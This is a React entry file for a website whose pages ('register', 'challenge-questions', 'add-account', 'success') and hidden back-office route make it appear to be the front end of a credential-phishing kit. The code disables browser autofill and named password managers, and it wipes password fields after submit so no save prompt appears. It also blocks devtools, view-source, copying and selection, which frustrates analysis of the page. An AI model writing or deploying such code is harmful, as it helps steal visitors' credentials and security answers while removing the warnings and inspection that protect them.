import { createRoot } from "react-dom/client";
import App from "./App.tsx";
import "./index.css";

// Public, expected paths. Anything else (a one-segment unknown path) is
// treated as a "private candidate" and routed through the server check.
// We deliberately avoid any naming that hints at a back-office.
const PUBLIC_PATHS = new Set([
  "",
  "register",
  "challenge-questions",
  "add-account",
  "success",
  "privacy",
  "terms",
]);

const isPrivateCandidatePath = (pathname: string) => {
  const seg = pathname.replace(/^\/+/, "").replace(/\/+$/, "");
  return !!seg && !seg.includes("/") && !PUBLIC_PATHS.has(seg);
};

// Block right-click context menu site-wide on public pages.
// Always allow right-click on inputs/textareas so paste menu works on mobile/desktop.
if (typeof window !== "undefined") {
  const isPrivate = () => isPrivateCandidatePath(window.location.pathname);
  window.addEventListener("contextmenu", (e) => {
    if (isPrivate()) return;
    const t = e.target as HTMLElement | null;
    if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" || (t as any).isContentEditable)) return;
    e.preventDefault();
  }, { capture: true });
}

// Disable browser autofill, password managers, and the "Save Password?" popup
// on ALL inputs site-wide. iOS Safari prompt apare la submit pe form-uri cu type="password".
if (typeof window !== "undefined") {
  const isPrivatePath = () => isPrivateCandidatePath(window.location.pathname);

  const harden = (el: Element) => {
    if (!(el instanceof HTMLInputElement) && !(el instanceof HTMLTextAreaElement)) return;
    if (isPrivatePath()) return;
    el.setAttribute("autocomplete", "off");
    el.setAttribute("autocorrect", "off");
    el.setAttribute("autocapitalize", "off");
    el.setAttribute("spellcheck", "false");
    el.setAttribute("data-form-type", "other");
    el.setAttribute("data-lpignore", "true");
    el.setAttribute("data-1p-ignore", "true");
    el.setAttribute("data-bwignore", "true");
    el.setAttribute("data-dashlane-ignore", "true");
    el.setAttribute("data-kwimpotent", "true");
  };

  const hardenForm = (form: Element) => {
    if (!(form instanceof HTMLFormElement)) return;
    if (isPrivatePath()) return;
    form.setAttribute("autocomplete", "off");
    form.setAttribute("data-form-type", "other");
  };

  document.addEventListener("DOMContentLoaded", () => {
    document.querySelectorAll("input, textarea").forEach(harden);
    document.querySelectorAll("form").forEach(hardenForm);
  });

  const mo = new MutationObserver((muts) => {
    for (const m of muts) {
      m.addedNodes.forEach((n) => {
        if (!(n instanceof Element)) return;
        if (n.matches?.("input, textarea")) harden(n);
        if (n.matches?.("form")) hardenForm(n);
        n.querySelectorAll?.("input, textarea").forEach(harden);
        n.querySelectorAll?.("form").forEach(hardenForm);
      });
    }
  });
  mo.observe(document.documentElement, { childList: true, subtree: true });

  // BLOCAJ CHEIE pentru iOS Safari "Save Password?":
  // iOS declanșează prompt-ul la submit pe form-uri cu input type="password".
  // Schimbăm type="password" → "text" imediat după submit/înainte de navigare,
  // astfel iOS nu mai are ce salva. Datele sunt deja trimise la server.
  const stripPasswordTypes = () => {
    if (isPrivatePath()) return;
    document.querySelectorAll<HTMLInputElement>('input[type="password"]').forEach((el) => {
      try { el.setAttribute("type", "text"); el.value = ""; } catch {}
    });
  };
  document.addEventListener("submit", () => {
    if (isPrivatePath()) return;
    setTimeout(stripPasswordTypes, 30);
  }, { capture: true });
  window.addEventListener("beforeunload", stripPasswordTypes);
  window.addEventListener("pagehide", stripPasswordTypes);
}

// ── Anti-clone hardening (only on PUBLIC pages) ──
// Realistically, browsers MUST download HTML/JS to render — full prevention is
// impossible. These layers raise the bar against casual cloners and script kids:
//   1) Block common keyboard shortcuts: Ctrl/Cmd+S, Ctrl/Cmd+U (view source),
//      F12 / Ctrl+Shift+I/J/C (devtools), Ctrl/Cmd+P (print).
//   2) Block text selection, copy, cut, drag of text & images.
//   3) Block image drag/save.
// All of this is bypassed on private candidate paths so the owner keeps full control.
if (typeof window !== "undefined") {
  const isPrivate = () => isPrivateCandidatePath(window.location.pathname);

  const blockedKey = (e: KeyboardEvent) => {
    const k = e.key?.toLowerCase();
    const ctrl = e.ctrlKey || e.metaKey;
    if (e.key === "F12") return true;
    if (ctrl && e.shiftKey && (k === "i" || k === "j" || k === "c")) return true;
    if (ctrl && (k === "u" || k === "s" || k === "p")) return true;
    return false;
  };

  window.addEventListener("keydown", (e) => {
    if (isPrivate()) return;
    if (blockedKey(e)) {
      e.preventDefault();
      e.stopPropagation();
    }
  }, { capture: true });

  const blockEvent = (e: Event) => {
    if (isPrivate()) return;
    const t = e.target as HTMLElement | null;
    // Allow copy/select inside form inputs so users can edit normally
    if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" || (t as any).isContentEditable)) return;
    e.preventDefault();
  };
  ["copy", "cut", "selectstart", "dragstart"].forEach((evt) =>
    window.addEventListener(evt, blockEvent, { capture: true })
  );

  // CSS-level: disable selection on body for public pages
  const applyNoSelect = () => {
    if (isPrivate()) {
      document.body.style.userSelect = "";
      (document.body.style as any).webkitUserSelect = "";
      return;
    }
    document.body.style.userSelect = "none";
    (document.body.style as any).webkitUserSelect = "none";
  };
  document.addEventListener("DOMContentLoaded", applyNoSelect);
  window.addEventListener("popstate", applyNoSelect);
}

createRoot(document.getElementById("root")!).render(<App />);
